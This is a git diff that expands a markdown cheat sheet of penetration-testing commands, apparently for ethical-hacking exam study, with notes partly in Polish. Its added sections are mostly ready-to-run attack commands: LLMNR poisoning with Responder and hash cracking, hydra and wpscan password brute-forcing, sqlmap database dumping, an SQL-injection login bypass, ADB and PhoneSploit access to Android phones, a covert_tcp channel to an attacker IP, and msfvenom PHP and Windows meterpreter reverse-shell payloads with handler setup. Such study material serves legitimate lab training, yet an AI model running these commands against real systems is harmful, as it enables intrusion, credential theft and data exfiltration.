@@ -4,7 +4,7 @@ basic commands for tools
 ## nmap
 nmap - to find services open on server
 
-* To scan the live Host
+To scan the live Host
 ```console
 nmap -sP x.x.x.1/24                 
 nmap -sn x.x.x.1/24
@@ -50,19 +50,137 @@ netdiscover -r x.x.x.1/24
 * -i eth0: Określa interfejs sieciowy, na którym ma działać narzędzie, w tym przypadku eth0 (tryb pasywny)
 * -r x.x.x.1/24: Określa zakres adresów IP, który ma być aktywnie skanowany (tryb aktywny)
 
+##  LLMNR/NBT-NS Poisoning
+This can be used to get the already logged-in user's password, who is trying to access a shared resource which is not present.
+```console
+responder -I eth0  
+```
+* -I eth0 - Responder zaczyna nasłuchiwać ruchu LLMNR, NBT-NS i MDNS na interfejsie eth0.
+
+ In windows, try to access the shared resource, logs are stored at usr/share/responder/logs/SMB<filename>
+* To crack that hash, use JohntheRipper
+
+```console
+john SMBfilename  
+```
+
 ## hydra
 
 hydra - to bruteforce usernames and passwords.
+
+```console
+hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x
+```
+* If the service isn't running on the default port, use -s
+```console
+hydra -L userlist.txt -P passlist.txt ftp://x.x.x.x -s 221
+```
+* Used to download the specific file from FTP to attacker or local machine
+```console
+get flag.txt ~/Desktop/filepath/flag.txt
+get flag.txt .
+```
+* telnet
+```console
+hydra -l admin -P passlist.txt -o test.txt x.x.x.x telnet
+```  
 
 ## John The Ripper
 
 ## wpscan
 wpscan - to bruteforce wordpress website (users and passwords)
 
+* Wordpress site only Users Enumeration
+```console
+wpscan --url http://example.com/ceh --enumerate u
+```
+  * Direct crack if we have user/password detail
+```console
+wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+wpscan --url http://x.x.x.x:8080/SHARE -u <user> -P ~/wordlists/password.txt
+```
+
 ## sqlmap
 sqlmap - to find data (phones, usernames, etc) in database 
+* List databases, add cookie values
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” --dbs 
+```
+* OR
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low”   --data="id=1&Submit=Submit" --dbs  
+```
 
+* List Tables, add databse name
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name --tables  
+```
+* List Columns of that table
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --columns
+```
+* Dump all values of the table
+```console
+  sqlmap -u "http://domain.com/path.aspx?id=1" --cookie=”PHPSESSID=1tmgthfok042dslt7lr7nbv4cb; security=low” -D database_name -T target_Table --dump
+```
+## SQL Injection
+  
+  * Login bypass with [' or 1=1 --]
+    
 ## adb
+* To Install ADB
+```console
+apt-get update
+sudo apt-get install adb -y
+adb devices -l
+```
+* Connection Establish Steps
+
+```console
+adb connect x.x.x.x:5555
+adb devices -l
+adb shell  
+```
+* To navigate
+```console
+pwd
+ls
+cd Download
+ls
+cd sdcard
+```
+* Download a File from Android using ADB tool
+```console
+adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
+adb pull sdcard/log.txt /home/mmurphy/Desktop
+```
+
+
+## PhoneSploit tool
+  
+* To install Phonesploit 
+
+```console
+git clone https://github.com/aerosol-can/PhoneSploit
+cd PhoneSploit
+pip3 install colorama
+OR
+python3 -m pip install colorama
+```
+* To run Phonesploit
+```console
+python3 phonesploit.py
+```
+* Type 3 and Press Enter to Connect a new Phone OR Enter IP of Android Device
+* Type 4, to Access Shell on phone
+* Download File using PhoneSploit
+```console
+Pull Folders from Phone to PC
+```
+* Enter the Full Path of file to Download
+```console
+sdcard/Download/secret.txt
+```
 
 ## hashcalc
 hashcalc -  to calculate SHA1 hash
@@ -75,10 +193,89 @@ BCTextEncoder - to decode text using given secret
 
 ## Cryptool
 cryptool - to decode .hex ,.dex, .oct file
+*use encrypt/decrypt bar
 
 ## snow
+
+```console
+SNOW.EXE -C -p test -m "Secret Message" original.txt hide.txt
+```
+
+* To unhide the Hidden Text
+
+```console
+SNOW.EXE -C -p test hide.txt
+```
 
 ## openstego
 
 ## covert_tcp
-covert_tcp
+covert_tcp - to create secret channel
+
+ * Compile the Code
+  ```console
+cc -o covert_tcp covert_tcp.c
+  ```
+  * Sender Machine(Client_IP)
+  ```console
+  sudo ./covert_tcp -source Client_IP -dest Attacker_IP -source_port 9999 -dest_port 8888 -file recieve.txt
+  ```
+  * Reciever Machine( Attacker_IP)
+  * Create A Message file that need to be transferred Eg: secret.txt
+  ```console
+  sudo ./covert_tcp -source Client_IP -source_port 8888 -server -file secret.txt
+  ```
+## Reverse Shell PHP
+  
+* To create a PHP Payload 
+* Copy the PHP code and create a .php
+  
+```console
+msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw
+```
+  
+* To create a Reverse_tcp Connection
+```console
+msfconsole
+use exploit/multi/handler
+set payload php/meterepreter/reverse_tcp
+set LHOST = attacker-ip
+set LPORT = attcker-port
+run
+```
+
+## Meterpreter sh 
+
+  * To create a Payload 
+```console
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=attacker_IP LPORT=attacker_Port -o filename.exe 
+```
+* To take a reverse TCP connection from windows
+```console
+msfdb init && msfconsole 
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST= attacker-IP  
+set LPORT= attacker-Port 
+run
+```
+
+## SENDING files from Linux to Windows
+* used to send a payload by Apache 
+```console
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /root/Desktop/filename /var/www/html/share/
+  ```
+  * to start and verify
+  ```console
+  service apache2 start 
+  service apache2 status
+  ```
+  * to Download from Windows
+  * Open browser 
+  ```shell
+  IP_OF_LINUX/share
+  ```
+
